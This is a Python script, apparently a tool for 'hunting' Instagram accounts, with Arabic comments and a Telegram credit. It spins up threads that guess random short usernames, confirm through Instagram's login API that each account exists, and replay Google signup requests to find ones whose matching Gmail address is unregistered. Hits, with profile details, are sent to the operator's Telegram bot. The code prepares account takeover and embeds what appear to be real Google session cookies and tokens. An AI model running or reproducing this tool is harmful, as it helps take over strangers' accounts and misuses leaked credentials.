import random,requests,time;from uuid import uuid4;uui,uid= uuid4(),uuid4();from rich.console import Console;from rich.table import Table;from user_agent import generate_user_agent;import threading;from AegosPy import GetInfoInsta
import datetime,sys
import os
import webbrowser

 
O = '\x1b[38;5;208m' #برتقالي
R = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
K = '\033[2;35m'
C1 = '\033[2;35m'
B = '\033[2;36m'#سمائي
from rich.panel import Panel as St
from rich import print as stef
print(f""" 
⣿⡿⣱⣶⣽⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣫⣶⣮⢿⣿
⢱⣾⣿⣿⣜⢿⣿⡿⢿⣫⣭⣶⣶⣿⣿⣿⣿⣷⣶⣯⣝⡻⢿⣿⡿⣣⣿⣿⣿⡎
⣷⣽⣶⣝⢿⣷⣍⠲⣿⣿⠿⣛⣭⣽⣶⣶⣮⣭⣛⠻⣿⣿⠗⣩⣾⡿⣫⣶⣿⣾
⣿⣿⣿⣿⢇⡙⢿⣷⢌⣵⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡁⢾⡿⢋⡸⣿⣿⣿⣿
⣿⣿⣿⡏⣾⣿⡦⣡⣿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⢿⣦⢰⣿⣷⣸⣿⣿⣿
⣿⣿⡿⠹⣛⣛⣁⣀⡤⠤⠤⢤⣤⣤⣤⣤⣤⣤⡤⠤⠤⢤⣀⣀⣛⣛⠇⢿⣿⣿
⣿⣇⠾⣿⣿⡏⣵⣶⣿⠿⠛⠛⠿⣿⣿⣿⣿⡿⠛⠛⠿⣿⣶⣮⢹⣿⣿⠷⢸⣿
⣿⣿⣇⢲⣬⡅⣿⣿⠁⠀⠀⠀⠀⠘⣿⣿⠋⠀⠀⠀⠀⠈⢿⣿⢨⣥⣶⣸⣿⣿
⣿⣿⣿⠸⣿⣿⡸⣿⠀⠀⠀⠀⠀⠀⣿⣿⡀⠀⠀⠀⠀⠀⣼⡏⣼⣿⡇⣿⣿⣿
⣿⣿⣿⣇⢻⣿⣷⡙⢷⣤⣀⣀⣤⣾⠛⠛⣷⣤⣄⣀⣤⣾⢏⣼⣿⡿⣸⣿⣿⣿
⣿⣿⣿⣿⣦⠻⠟⣡⣦⡙⢿⣿⣿⣿⣤⣤⣿⣿⣿⡿⢟⣵⣌⠻⠟⣱⣿⣿⣿⣿
⣿⣿⣿⣿⡿⣣⣾⡿⢋⣴⠇⢪⡍⣛⣛⣛⣛⢩⡵⠐⣦⡙⢿⣷⣜⢿⣿⣿⣿⣿
⡿⣿⠿⣫⣾⡿⣫⣾⣦⣍⡀⡳⢠⣽⣇⣸⣯⡄⢞⢀⣩⣵⣶⣝⢿⣷⣝⠿⣿⢿
⡸⢿⣿⣿⢫⣾⣿⣿⣿⣿⣷⡹⣶⣾⣧⣼⣷⣶⢟⣼⣿⣿⣿⣿⣷⡝⣿⣿⣿⢇
⣿⣷⡹⠿⣻⣿⣿⣿⣿⣿⣿⣿⣦⣭⣟⣻⣭⣵⣿⣿⣿⣿⣿⣿⣿⣟⠿⢟⣾⣿⠀⠀⠀⠀
""")
print('\033[1;33mTelegram \033[1;31m>>>> \033[2;36m@i4m_DYN0 -\033[2;32m KING🔥')
print('\033[2;36m▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱')
tok = input('𝐄𝐧𝐭𝐞𝐫 𝐓𝐨𝐤𝐞𝐧 : ' + B)
print('\n')
iD = input('ID : ' + B)
requests.get('https://api.telegram.org/bot' + str(tok) + '/sendMessage?chat_id=' + str(iD) + '&text=')
os.system('clear')

ugen2 = []
ugen = []
cokbrut = []
ses = requests.Session()
def gmail(email):	
	url =  'https://i.instagram.com/api/v1/accounts/login/'
	headers = { 'Accept': '*/*',
'Accept-Encoding': 'gzip, deflate',
'Accept-Language': 'en-US',
'X-IG-Capabilities': '3brTvw==',
'X-IG-Connection-Type': 'WIFI',
'Host': 'i.instagram.com',
'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
'User-Agent':'Instagram 114.0.0.0.41 Android (30/3.0; 240dpi; 1242x2688; huawei/google; samsung; angler; angler; en_US)',
'Cookie': 'missing' }
	data = {'uuid':uid,  'password':'@abs7e',
              'username':email,
              'device_id':uid,
              'from_reg':'false',
              '_csrftoken':'missing',
              'login_attempt_countn':'0'}
	req= requests.post(url, headers=headers, data=data).json()
	if req['message'] == 'The password you entered is incorrect. Please try again.':
		email = email+'@gmail.com'
		print(X+f'Wait  : {email}')
		url1 = 'https://accounts.google.com/_/signup/validatepersonaldetails?hl=ar&_reqid=82313&rt=j'
		headers1 = {
            'Accept':'*/*',
            'Accept-Encoding':'gzip, deflate, br',
            'Accept-Language':'ar,en-US;q=0.9,en;q=0.8,pt;q=0.7',
            'Content-Length':'2012',
            'Content-Type':'application/x-www-form-urlencoded;charset=UTF-8',
            'Cookie':'HSID=AKns6WEN7Wob5S0PL; SSID=AzqTxPQlZ0AkkU5Rj; APISID=9BN4pfxrUMbjkV0y/A9RAWK6baRAEWup7C; SAPISID=lz5nEQDQLnmDsQP6/AoooG1y3D_wh-NSKu; __Secure-1PAPISID=lz5nEQDQLnmDsQP6/AoooG1y3D_wh-NSKu; __Secure-3PAPISID=lz5nEQDQLnmDsQP6/AoooG1y3D_wh-NSKu; ACCOUNT_CHOOSER=AFx_qI4i4F-SJeNXimyuT1TsLzQGoirwEMQbDTUSf8_qRJiH3VvA80439gS5xk0yfLievE4F3Y0vLwBzA0RQTcPYn1_dd3X2622sgrALE9OQtvqRpE3NxSH8dvV5WyUDY8nRlHYEuXzz; SEARCH_SAMESITE=CgQI-pgB; SID=awittPRSDweLi6wc_iKDv_gb-Im6jSFWio6J4dKr0PlwceJ7wTyFvfWk6B5sPxW_FaoYEQ.; __Secure-1PSID=awittPRSDweLi6wc_iKDv_gb-Im6jSFWio6J4dKr0PlwceJ710TXG4Jt_bjbBwdKebi3pw.; __Secure-3PSID=awittPRSDweLi6wc_iKDv_gb-Im6jSFWio6J4dKr0PlwceJ7TQf-K0pmaViWQPPDdPTgRg.; LSID=o.admin.google.com|o.groups.google.com|o.mail.google.com|o.myaccount.google.com|o.play.google.com|s.GB|s.IQ|s.youtube:awittO8lNCt5XV0HIOjNHwwoenpea1aoldSvnQAaJ4M6PIZZAfn5WR6msbm-dkQzgpJbog.; __Host-1PLSID=o.admin.google.com|o.groups.google.com|o.mail.google.com|o.myaccount.google.com|o.play.google.com|s.GB|s.IQ|s.youtube:awittO8lNCt5XV0HIOjNHwwoenpea1aoldSvnQAaJ4M6PIZZaDY2Dsx7Ecs20HT5d52b5g.; __Host-3PLSID=o.admin.google.com|o.groups.google.com|o.mail.google.com|o.myaccount.google.com|o.play.google.com|s.GB|s.IQ|s.youtube:awittO8lNCt5XV0HIOjNHwwoenpea1aoldSvnQAaJ4M6PIZZFTXp5-IXaSFzxYb7CQkjjA.; AEC=Ackid1Sq4MbYErBR_Us0tf9WFDtcuwvzHrRH5Yve8rLOlw_RSIjKFLIBTA; OTZ=7221341_44_44__44_; NID=511=eWtVDIf4hG2j9mDnnIa4x5w78Y1yjEI0iSl9YxtW0mSdgNSmGdueFUSz5v9DVu7QXaEFzSzL4ajsSVYBKNOJ1ansnWB5Zfw3-9flbVP-Q_9oVAbjlwZLdFyrG24gyA3QScjCb_o5K1_31NsxTUmgb3PtC_mgJhjN8-I1ntb4ZPSzOdfMoJhlfgS3rrXhnsW9y9OXmV_5LeWtTWbUapV6Hqi54nNF-A973IJNQ3vjHT96YO9BzD7vAF0Fz4QJCR5yrAdtTL9CODRVXJDa0D7BcrUzwuD3BHtSeICl4ucMO80itXie8oMydXNhFEzBicC65MZ_3zyxfhY; __Secure-1PSIDTS=sidts-CjIB3e41hQlx-Wv4BiGfmjzJuQ98u0cICR1fDu4PFy8f3ICss2VVW2DOOCWtxRVJZxOc7RAA; __Secure-3PSIDTS=sidts-CjIB3e41hQlx-Wv4BiGfmjzJuQ98u0cICR1fDu4PFy8f3ICss2VVW2DOOCWtxRVJZxOc7RAA; 1P_JAR=2023-9-24-19; __Host-GAPS=1:iFhDk8pCf_rD1y3_iK2rTNHPPXyeFdUNSUjVgFZCL3Ltep11xrrj3uMllHFN7PihHvMGMTJMk7wzsbxtkkxqQ_UwnvxmvQ:vzp7p_rGftukpa7K; SIDCC=APoG2W89V3Dj40h3I70mlxHqCsOnBqi1Y1IrqdrZ28s11C3oE9Cgl3AFna_0iqMulMurcnIZUAI; __Secure-1PSIDCC=APoG2W-pHOrjlyneewhmwgzwCclUzrXhQKOfz0m4R3IyzCDXjIeFlwOQibw94fcCWMCApPTYxlc; __Secure-3PSIDCC=APoG2W8sda3Sda4T54ef6cME8uLFklJ3FfAkNIEevAOou3ZHau6ityTVjk9n4Bb7qiCEFhiNyw',
            'Google-Accounts-Xsrf':'1',
            'Origin':'https://accounts.google.com',
            'Referer':'https://accounts.google.com/signup/v2/createaccount?theme=glif&flowName=GlifWebSignIn&flowEntry=SignUp',
            'Sec-Ch-Ua':'"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
            'Sec-Ch-Ua-Arch':'"x86"',
            'Sec-Ch-Ua-Bitness':'"64"',
            'Sec-Ch-Ua-Full-Version':'"116.0.5845.188"',
            'Sec-Ch-Ua-Full-Version-List':'"Chromium";v="116.0.5845.188", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="116.0.5845.188"',
            'Sec-Ch-Ua-Mobile':'?0',
            'Sec-Ch-Ua-Model':'""',
            'Sec-Ch-Ua-Platform':'"Windows"',
            'Sec-Ch-Ua-Platform-Version':'"10.0.0"',
            'Sec-Ch-Ua-Wow64':'?0',
            'Sec-Fetch-Dest':'empty',
            'Sec-Fetch-Mode':'cors',
            'Sec-Fetch-Site':'same-origin',
            'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            'X-Chrome-Id-Consistency-Request':'version=1,client_id=77185425430.apps.googleusercontent.com,device_id=b20ba583-8cad-46a7-80ea-88e6755866ad,sync_account_id=105342098533404169783,signin_mode=all_accounts,signout_mode=show_confirmation',
            'X-Client-Data':'CIe2yQEIpbbJAQipncoBCMzfygEIlKHLAQiFoM0BCI2yzQEI3L3NAQjfxM0BCOnFzQEIucrNAQjV0M0BCJHSzQEIitPNAQj5wNQVGPXJzQE=',
            'X-Same-Domain':'1'
            }
		data1 = {
            'theme': 'glif',
            '': 'https://accounts.google.com/ManageAccount?nc=1',
            'f.req': '["AEThLlzavccs_MdaDMBDfSU7NEeTKr02URa8Y9GAk-2d5ygvEJv1okzAOPzpFw_rFw7MwSmg0m4SxVvZNNMz97nf2-NlwAlseWtZSAdlgAwoVzJaYtv-tuezCMXj8lHpLGDJbv2PEVTDn47o79z30klv1McaYIuuIW8xRVelt4tQ3jbscrpSkCTv7cT5a5A3FvaQISHBljEF",null,null,null,null,0,0,"strrgrs","strrgrs","web-glif-signup",0,null,10,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"b20ba583-8cad-46a7-80ea-88e6755866ad",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,null,[]],null,null,null,null,null,null,[],null,null,null,null,[]],1]',
            'at': 'AFoagUUzkiOnQaoRtzNNCpQ0ha9o8tIkSQ:1695585059018',
            'azt': 'AFoagUUi89PpEd8CL8NrG88__muZtPuD_w:1695585059018',
            'cookiesDisabled': 'false',
            'deviceinfo': '[null,null,null,[],null,"IQ",null,null,null,"GlifWebSignIn",null,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"b20ba583-8cad-46a7-80ea-88e6755866ad",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,null,[]],null,null,null,null,null,null,[],null,null,null,null,[]],null,null,null,null,1,null,0,1,"",null,null,2,2]',
            'gmscoreversion': 'undefined',
            'flowName': 'GlifWebSignIn',
            'checkConnection': 'youtube:290:0',
            'checkedDomains': 'youtube',
            'pstMsg': '1',
            }

		re = requests.post(url1,headers=headers1,data=data1).text
		TLL = re.split('["gf.ttu",null,"')[1].split('"],')[0]

		url2 = ('https://accounts.google.com/_/signup/validatebasicinfo?hl=ar&TL=AJeL0C43qObZzGhdyZTfL_-PeEXerBAQ8r6OB8Tq1uhlCyJ0Y-WKaVwPFuDvjohv&_reqid=283689&rt=j')

		headers2 = {
            'Accept':'*/*',
            'Accept-Encoding':'gzip, deflate, br',
            'Accept-Language':'ar,en-US;q=0.9,en;q=0.8,pt;q=0.7',
            'Content-Length':'1243',
            'Content-Type':'application/x-www-form-urlencoded;charset=UTF-8',
            'Cookie':'HSID=AKns6WEN7Wob5S0PL; SSID=AzqTxPQlZ0AkkU5Rj; APISID=9BN4pfxrUMbjkV0y/A9RAWK6baRAEWup7C; SAPISID=lz5nEQDQLnmDsQP6/AoooG1y3D_wh-NSKu; __Secure-1PAPISID=lz5nEQDQLnmDsQP6/AoooG1y3D_wh-NSKu; __Secure-3PAPISID=lz5nEQDQLnmDsQP6/AoooG1y3D_wh-NSKu; ACCOUNT_CHOOSER=AFx_qI4i4F-SJeNXimyuT1TsLzQGoirwEMQbDTUSf8_qRJiH3VvA80439gS5xk0yfLievE4F3Y0vLwBzA0RQTcPYn1_dd3X2622sgrALE9OQtvqRpE3NxSH8dvV5WyUDY8nRlHYEuXzz; SEARCH_SAMESITE=CgQI-pgB; SID=awittPRSDweLi6wc_iKDv_gb-Im6jSFWio6J4dKr0PlwceJ7wTyFvfWk6B5sPxW_FaoYEQ.; __Secure-1PSID=awittPRSDweLi6wc_iKDv_gb-Im6jSFWio6J4dKr0PlwceJ710TXG4Jt_bjbBwdKebi3pw.; __Secure-3PSID=awittPRSDweLi6wc_iKDv_gb-Im6jSFWio6J4dKr0PlwceJ7TQf-K0pmaViWQPPDdPTgRg.; LSID=o.admin.google.com|o.groups.google.com|o.mail.google.com|o.myaccount.google.com|o.play.google.com|s.GB|s.IQ|s.youtube:awittO8lNCt5XV0HIOjNHwwoenpea1aoldSvnQAaJ4M6PIZZAfn5WR6msbm-dkQzgpJbog.; __Host-1PLSID=o.admin.google.com|o.groups.google.com|o.mail.google.com|o.myaccount.google.com|o.play.google.com|s.GB|s.IQ|s.youtube:awittO8lNCt5XV0HIOjNHwwoenpea1aoldSvnQAaJ4M6PIZZaDY2Dsx7Ecs20HT5d52b5g.; __Host-3PLSID=o.admin.google.com|o.groups.google.com|o.mail.google.com|o.myaccount.google.com|o.play.google.com|s.GB|s.IQ|s.youtube:awittO8lNCt5XV0HIOjNHwwoenpea1aoldSvnQAaJ4M6PIZZFTXp5-IXaSFzxYb7CQkjjA.; AEC=Ackid1Sq4MbYErBR_Us0tf9WFDtcuwvzHrRH5Yve8rLOlw_RSIjKFLIBTA; OTZ=7221341_44_44__44_; NID=511=eWtVDIf4hG2j9mDnnIa4x5w78Y1yjEI0iSl9YxtW0mSdgNSmGdueFUSz5v9DVu7QXaEFzSzL4ajsSVYBKNOJ1ansnWB5Zfw3-9flbVP-Q_9oVAbjlwZLdFyrG24gyA3QScjCb_o5K1_31NsxTUmgb3PtC_mgJhjN8-I1ntb4ZPSzOdfMoJhlfgS3rrXhnsW9y9OXmV_5LeWtTWbUapV6Hqi54nNF-A973IJNQ3vjHT96YO9BzD7vAF0Fz4QJCR5yrAdtTL9CODRVXJDa0D7BcrUzwuD3BHtSeICl4ucMO80itXie8oMydXNhFEzBicC65MZ_3zyxfhY; __Secure-1PSIDTS=sidts-CjIB3e41hSBcUhP8NyqWW2ADaxGlP5fNz_9VqNVEKSaMEABFvwEhLgGZ093XkB38enu2ZRAA; __Secure-3PSIDTS=sidts-CjIB3e41hSBcUhP8NyqWW2ADaxGlP5fNz_9VqNVEKSaMEABFvwEhLgGZ093XkB38enu2ZRAA; 1P_JAR=2023-9-24-20; __Host-GAPS=1:NH4ff_ca85MbS_Oy22i-HVW9z7iTfoC9f7WpMXewN1CAIy7lv2A8Gkt1Cn3h1lGFzfpwVNpa4KbEeoNpa3f01hkIR9dV8w:ucYsdrNQRlvj2wLH; SIDCC=APoG2W_i5paMflXBUncC2H4tWKnnYlb6EN8mJavQ5QD7I6Boz_mPhgHHY5atNHEaKvXASATVAq0; __Secure-1PSIDCC=APoG2W_CSoBIIpl_-YgzWNDlpF2az6b6WUUQbUlsvAmYyDP5wN7c17Nwcrn3MGeapKh-8jf7Pc8; __Secure-3PSIDCC=APoG2W-cSJNfs98t1YDG74w8iT6WSDBWGSXUJ_FuzxeBgEaVPZxxcpMwxlY2RUMvCXd-erQ4Dw',
            'Google-Accounts-Xsrf':'1',
            'Origin':'https://accounts.google.com',
            'Referer':'https://accounts.google.com/signup/v2/birthdaygender?theme=glif&flowName=GlifWebSignIn&flowEntry=SignUp&TL=AJeL0C43qObZzGhdyZTfL_-PeEXerBAQ8r6OB8Tq1uhlCyJ0Y-WKaVwPFuDvjohv',
            'Sec-Ch-Ua':'"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
            'Sec-Ch-Ua-Arch':'"x86"',
            'Sec-Ch-Ua-Bitness':'"64"',
            'Sec-Ch-Ua-Full-Version':'"116.0.5845.188"',
            'Sec-Ch-Ua-Full-Version-List':'"Chromium";v="116.0.5845.188", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="116.0.5845.188"',
            'Sec-Ch-Ua-Mobile':'?0',
            'Sec-Ch-Ua-Model':'""',
            'Sec-Ch-Ua-Platform':'"Windows"',
            'Sec-Ch-Ua-Platform-Version':'"10.0.0"',
            'Sec-Ch-Ua-Wow64':'?0',
            'Sec-Fetch-Dest':'empty',
            'Sec-Fetch-Mode':'cors',
            'Sec-Fetch-Site':'same-origin',
            'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            'X-Chrome-Id-Consistency-Request':'version=1,client_id=77185425430.apps.googleusercontent.com,device_id=b20ba583-8cad-46a7-80ea-88e6755866ad,sync_account_id=105342098533404169783,signin_mode=all_accounts,signout_mode=show_confirmation',
            'X-Client-Data':'CIe2yQEIpbbJAQipncoBCMzfygEIlKHLAQiFoM0BCI2yzQEI3L3NAQjfxM0BCOnFzQEIucrNAQjV0M0BCJHSzQEIitPNAQj5wNQVGPXJzQE=',
            'X-Same-Domain':'1'
            }

		data2 = {
            'theme': 'glif',
            '': 'https://accounts.google.com/ManageAccount?nc=1',
            'f.req': f'["TL:{TLL}",1999,3,6,2,null,null,0,null,null,0,0]',
            'at': 'AFoagUXYUhTvUEnQe3grDoZb22BYTBUXFg:1695586462543',
            'azt': 'AFoagUWQYD1CqlgiVRQg71n710QgPsx-jA:1695586462544',
            'cookiesDisabled': 'false',
            'deviceinfo': '[null,null,null,[],null,"IQ",null,null,null,"GlifWebSignIn",null,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"b20ba583-8cad-46a7-80ea-88e6755866ad",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,null,[]],null,null,null,null,null,null,[],null,null,null,null,[]],null,null,null,null,1,null,0,1,"",null,null,2,2]',
            'gmscoreversion': 'undefined',
            'flowName': 'GlifWebSignIn',
            'checkConnection': 'youtube:486:0',
            'checkedDomains': 'youtube',
            'pstMsg': '1'
            }

		re2 = requests.post(url2,headers=headers2,data=data2).text

		TLL2 = re2.split('["gf.bgvr",1,0,0,"TL:')[1].split('",null,null,0,24,null,null,0],["e",2,null,null,146]]]')[0]


		link = 'https://accounts.google.com/_/signup/usernameavailability?&rt=j'

		headers= {
            'accept':'*/*',
            'accept-encoding':'gzip, deflate',
            'accept-language':'en-US,en;q=0.8,ar;q=0.6',
            'content-length':'973',
            'content-type':'application/x-www-form-urlencoded;charset=UTF-8',
            'cookie':f'OGP=-19019112:; OGPC=19019112-2:; AEC=Ackid1S23dF7bQM-_0OCQUIMAxlJT6UQ7kJ67WfjoZ4GR9QaUf7nVUGeS98; NID=511=Teo8xCZ02OFPC6FlYoX2um01GIrlb9UR6NBlG6aZT8_y7C5LKgyCDGnoyjWE1qCa6NDN4zolWTDuGmj_6xSFi4SY3sZ5sgL3NVVKdRvkQKaQQw6WF8KRVX-tB9FNWgPqI481IQ4td0TNIF4WBsgd1G-X_WwJLirnjZOMXMBwNiqHl8LzQrQRcQ; 1P_JAR=2023-09-23-19; __Host-GAPS=1:AI0Jr4suRW2V3Z9AJ_EHrOfuj8g1ow:j6tbQfvXA0_99rgx',
            'google-accounts-xsrf':'1',
            'origin':'https://accounts.google.com',
            'referer':'https://accounts.google.com/signup/v2/createusername?cc=IQ&dsh=S1929428821%3A1695499162771291&flowEntry=SignUp&flowName=GlifWebSignIn&hl=cy&ifkv=AYZoVhenrpZ4woEGqcGC8b6wc0PTEMJO_NmcsMrtUsh7wxI_uhZTz5NeS4keAc-QbkZv0DohSw4lmw&theme=glif&TL=AJeL0C76qwBDDsftUiC9xtxwA5EvN8ZC3FCHKjox9S3I2XkubvAQfYlgYI0jpKvL',
            'user-agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 UBrowser/6.0.1308.1016 Safari/537.36',
            'x-chrome-uma-enabled':'1',
            'x-same-domain':'1'
            }

		data = {
            'theme': 'glif',
            '': 'https://accounts.google.com/ManageAccount?nc=1',
            'f.req': f'["TL:{TLL2}","{email}",0,0,0,null,0,15856]',
            'at': 'AFoagUV7ayPwNwcTzAJd8hG5bsUQ9UspxA:1695553167761',
            'azt': 'AFoagUXaPxbm3Wne7jhJpuTr_KRQXXYYHQ:1695553167761',
            'cookiesDisabled': 'false',
            'deviceinfo': f'[null,null,null,[],null,"IQ",null,null,null,"GlifWebSignIn",null,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"{uui}",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,null,[]],null,null,null,null,null,null,[],null,null,null,null,[]],null,null,null,null,1,null,0,1,"",null,null,2,2]',
            'gmscoreversion': 'undefined',
            'flowName': 'GlifWebSignIn',
            'checkConnection': '',
            'checkedDomains': 'youtube',
            'pstMsg': '1'
            }
		response = requests.post(link,headers=headers,data=data).text
		if ('"gf.uar",1') in response:		  		
		  		print(F+f'متاح  : {email}')
		  		try:
		  			he={
'accept': '*/*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'ar,en;q=0.9',
'cookie': f'ig_did={uuid4}; datr=8J8TZD9P4GjWjawQJMcnRdV_; mid=ZBOf_gALAAGhvjQbR29aVENHIE4Z;l ig_nrcb=1; csrftoken=5DoPPeHPd4nUej9JiwCdkvwwmbmkDWpy; ds_user_id=56985317140;Bad Gmail dpr=1.25',
'referer': f'https://www.instagram.com/{email}/?hl=ar',
'sec-ch-prefers-color-scheme': 'dark',
'sec-ch-ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
'sec-ch-ua-full-version-list': '"Chromium";v="112.0.5615.138", "Google Chrome";v="112.0.5615.138", "Not:A-Brand";v="99.0.0.0"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Windows"',
'sec-ch-ua-platform-version': '"10.0.0"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-origin',
'user-agent': generate_user_agent(),
'viewport-width': '1051',
'x-asbd-id': '198387',
'x-csrftoken': '5DoPPeHPd4nUej9JiwCdkvwwmbmkDWpy',
'x-ig-app-id': '936619743392459',
'x-ig-www-claim': '0',
'x-requested-with': 'XMLHttpRequest',}
		  			user_hunt = email.split('@')[0]
		  			user = user_hunt
		  			Response = GetInfoInsta(user_hunt)
		  			Name = Response['name']
		  			Id = Response['id']
		  			flos = Response['followers']
		  			flog = Response['following']
		  			po = Response['posts']
		  			da = Response['date']
		  			tlg = (f"""
⋘─────━𓆩DYNO𓆪‏━────
𝐍𝐀𝐌𝐄 ---> {Name}
𝐔𝑆𝐸𝑅𝑁𝐴𝑀𝐸 ---> @{user}
𝐄𝐌𝐀𝐈l ---> {email}
𝐈𝐃 ---> {Id}
𝐅𝐎ll𝐎𝐖𝐄𝐑𝐒 ---> {flos}
𝐅𝐎ll𝐎𝐖𝐈𝐍𝐆 ---> {flog}
𝐏𝐎𝐒𝐓 ---> {po}
𝐃𝐀𝐓𝐀 ---> {da}
⋘─────━𓆩DYNO𓆪‏━─────⋙
BY ---> @i4m_DYN0 صور صيد
""")
		  			requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={iD}&text="+str(tlg))
		  		except:
		  			tlg = (f"""
⋘─────━𓆩DYNO𓆪‏━────
𝐍𝐀𝐌𝐄 ---> {Name}
𝐔𝑆𝐸𝑅𝑁𝐴𝑀𝐸 ---> @{user}
𝐄𝐌𝐀𝐈l ---> {email}
𝐈𝐃 ---> {Id}
𝐅𝐎ll𝐎𝐖𝐄𝐑𝐒 ---> {flos}
𝐅𝐎ll𝐎𝐖𝐈𝐍𝐆 ---> {flog}
𝐏𝐎𝐒𝐓 ---> {po}
𝐃𝐀𝐓𝐀 ---> {da}
⋘─────━𓆩DYNO𓆪‏━─────⋙
BY ---> @i4m_DYN0 صور صيد
""")
		  			requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={iD}&text="+str(tlg))			
		else:				
				print(X+f'Bad Gmail : {email}')
	else:												
				print(R+f'Band : {email}@gmail.com')

				
def users():
 while True:
  try:
  	user='1234567890.qwertyuiopasdfghjklzxcvbnm'
  	num='6789'
  	rng=int("".join(random.choice(num)for i in range(1)))
  	name=str("".join(random.choice(user)for i in range(rng)))
  	email = name
  	gmail(email)
  except IndexError:
   users()
Threads=[] 
for t in range(10):
 x = threading.Thread(target=users)
 x.start()
 Threads.append(x)
for Th in Threads:
 Th.join()
  
